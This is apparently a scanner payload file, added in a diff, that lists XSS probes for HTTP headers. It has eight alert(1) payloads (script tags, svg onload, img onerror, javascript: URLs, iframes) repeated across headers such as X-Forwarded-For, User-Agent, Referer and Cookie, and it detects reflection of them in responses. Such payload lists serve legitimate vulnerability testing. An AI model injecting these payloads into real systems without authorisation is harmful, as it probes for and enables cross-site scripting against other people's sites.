@@ -1,0 +1,163 @@
+# XSS via headers — header + payload collection
+# Detects unencoded reflection of script payloads in the response body
+# Fingerprints: fingerprints/xss.txt (raw <script>/<svg>/<img>/<iframe>/javascript: alert payloads)
+
+# X-Forwarded-For
+X-Forwarded-For: <script>alert(1)</script>
+X-Forwarded-For: "><script>alert(1)</script>
+X-Forwarded-For: '><script>alert(1)</script>
+X-Forwarded-For: <svg/onload=alert(1)>
+X-Forwarded-For: <img src=x onerror=alert(1)>
+X-Forwarded-For: "><img src=x onerror=alert(1)>
+X-Forwarded-For: javascript:alert(1)
+X-Forwarded-For: <iframe src=javascript:alert(1)>
+
+# X-Forwarded-Host
+X-Forwarded-Host: <script>alert(1)</script>
+X-Forwarded-Host: "><script>alert(1)</script>
+X-Forwarded-Host: '><script>alert(1)</script>
+X-Forwarded-Host: <svg/onload=alert(1)>
+X-Forwarded-Host: <img src=x onerror=alert(1)>
+X-Forwarded-Host: "><img src=x onerror=alert(1)>
+X-Forwarded-Host: javascript:alert(1)
+X-Forwarded-Host: <iframe src=javascript:alert(1)>
+
+# X-Forwarded-Server
+X-Forwarded-Server: <script>alert(1)</script>
+X-Forwarded-Server: "><script>alert(1)</script>
+X-Forwarded-Server: '><script>alert(1)</script>
+X-Forwarded-Server: <svg/onload=alert(1)>
+X-Forwarded-Server: <img src=x onerror=alert(1)>
+X-Forwarded-Server: "><img src=x onerror=alert(1)>
+X-Forwarded-Server: javascript:alert(1)
+X-Forwarded-Server: <iframe src=javascript:alert(1)>
+
+# X-Real-IP
+X-Real-IP: <script>alert(1)</script>
+X-Real-IP: "><script>alert(1)</script>
+X-Real-IP: '><script>alert(1)</script>
+X-Real-IP: <svg/onload=alert(1)>
+X-Real-IP: <img src=x onerror=alert(1)>
+X-Real-IP: "><img src=x onerror=alert(1)>
+X-Real-IP: javascript:alert(1)
+X-Real-IP: <iframe src=javascript:alert(1)>
+
+# X-Client-IP
+X-Client-IP: <script>alert(1)</script>
+X-Client-IP: "><script>alert(1)</script>
+X-Client-IP: '><script>alert(1)</script>
+X-Client-IP: <svg/onload=alert(1)>
+X-Client-IP: <img src=x onerror=alert(1)>
+X-Client-IP: "><img src=x onerror=alert(1)>
+X-Client-IP: javascript:alert(1)
+X-Client-IP: <iframe src=javascript:alert(1)>
+
+# X-Originating-IP
+X-Originating-IP: <script>alert(1)</script>
+X-Originating-IP: "><script>alert(1)</script>
+X-Originating-IP: '><script>alert(1)</script>
+X-Originating-IP: <svg/onload=alert(1)>
+X-Originating-IP: <img src=x onerror=alert(1)>
+X-Originating-IP: "><img src=x onerror=alert(1)>
+X-Originating-IP: javascript:alert(1)
+X-Originating-IP: <iframe src=javascript:alert(1)>
+
+# X-Host
+X-Host: <script>alert(1)</script>
+X-Host: "><script>alert(1)</script>
+X-Host: '><script>alert(1)</script>
+X-Host: <svg/onload=alert(1)>
+X-Host: <img src=x onerror=alert(1)>
+X-Host: "><img src=x onerror=alert(1)>
+X-Host: javascript:alert(1)
+X-Host: <iframe src=javascript:alert(1)>
+
+# X-Original-URL
+X-Original-URL: <script>alert(1)</script>
+X-Original-URL: "><script>alert(1)</script>
+X-Original-URL: '><script>alert(1)</script>
+X-Original-URL: <svg/onload=alert(1)>
+X-Original-URL: <img src=x onerror=alert(1)>
+X-Original-URL: "><img src=x onerror=alert(1)>
+X-Original-URL: javascript:alert(1)
+X-Original-URL: <iframe src=javascript:alert(1)>
+
+# X-Rewrite-URL
+X-Rewrite-URL: <script>alert(1)</script>
+X-Rewrite-URL: "><script>alert(1)</script>
+X-Rewrite-URL: '><script>alert(1)</script>
+X-Rewrite-URL: <svg/onload=alert(1)>
+X-Rewrite-URL: <img src=x onerror=alert(1)>
+X-Rewrite-URL: "><img src=x onerror=alert(1)>
+X-Rewrite-URL: javascript:alert(1)
+X-Rewrite-URL: <iframe src=javascript:alert(1)>
+
+# True-Client-IP
+True-Client-IP: <script>alert(1)</script>
+True-Client-IP: "><script>alert(1)</script>
+True-Client-IP: '><script>alert(1)</script>
+True-Client-IP: <svg/onload=alert(1)>
+True-Client-IP: <img src=x onerror=alert(1)>
+True-Client-IP: "><img src=x onerror=alert(1)>
+True-Client-IP: javascript:alert(1)
+True-Client-IP: <iframe src=javascript:alert(1)>
+
+# Forwarded
+Forwarded: <script>alert(1)</script>
+Forwarded: "><script>alert(1)</script>
+Forwarded: '><script>alert(1)</script>
+Forwarded: <svg/onload=alert(1)>
+Forwarded: <img src=x onerror=alert(1)>
+Forwarded: "><img src=x onerror=alert(1)>
+Forwarded: javascript:alert(1)
+Forwarded: <iframe src=javascript:alert(1)>
+
+# User-Agent
+User-Agent: <script>alert(1)</script>
+User-Agent: "><script>alert(1)</script>
+User-Agent: '><script>alert(1)</script>
+User-Agent: <svg/onload=alert(1)>
+User-Agent: <img src=x onerror=alert(1)>
+User-Agent: "><img src=x onerror=alert(1)>
+User-Agent: javascript:alert(1)
+User-Agent: <iframe src=javascript:alert(1)>
+
+# Referer
+Referer: <script>alert(1)</script>
+Referer: "><script>alert(1)</script>
+Referer: '><script>alert(1)</script>
+Referer: <svg/onload=alert(1)>
+Referer: <img src=x onerror=alert(1)>
+Referer: "><img src=x onerror=alert(1)>
+Referer: javascript:alert(1)
+Referer: <iframe src=javascript:alert(1)>
+
+# Origin
+Origin: <script>alert(1)</script>
+Origin: "><script>alert(1)</script>
+Origin: '><script>alert(1)</script>
+Origin: <svg/onload=alert(1)>
+Origin: <img src=x onerror=alert(1)>
+Origin: "><img src=x onerror=alert(1)>
+Origin: javascript:alert(1)
+Origin: <iframe src=javascript:alert(1)>
+
+# Accept-Language
+Accept-Language: <script>alert(1)</script>
+Accept-Language: "><script>alert(1)</script>
+Accept-Language: '><script>alert(1)</script>
+Accept-Language: <svg/onload=alert(1)>
+Accept-Language: <img src=x onerror=alert(1)>
+Accept-Language: "><img src=x onerror=alert(1)>
+Accept-Language: javascript:alert(1)
+Accept-Language: <iframe src=javascript:alert(1)>
+
+# Cookie
+Cookie: <script>alert(1)</script>
+Cookie: "><script>alert(1)</script>
+Cookie: '><script>alert(1)</script>
+Cookie: <svg/onload=alert(1)>
+Cookie: <img src=x onerror=alert(1)>
+Cookie: "><img src=x onerror=alert(1)>
+Cookie: javascript:alert(1)
+Cookie: <iframe src=javascript:alert(1)>
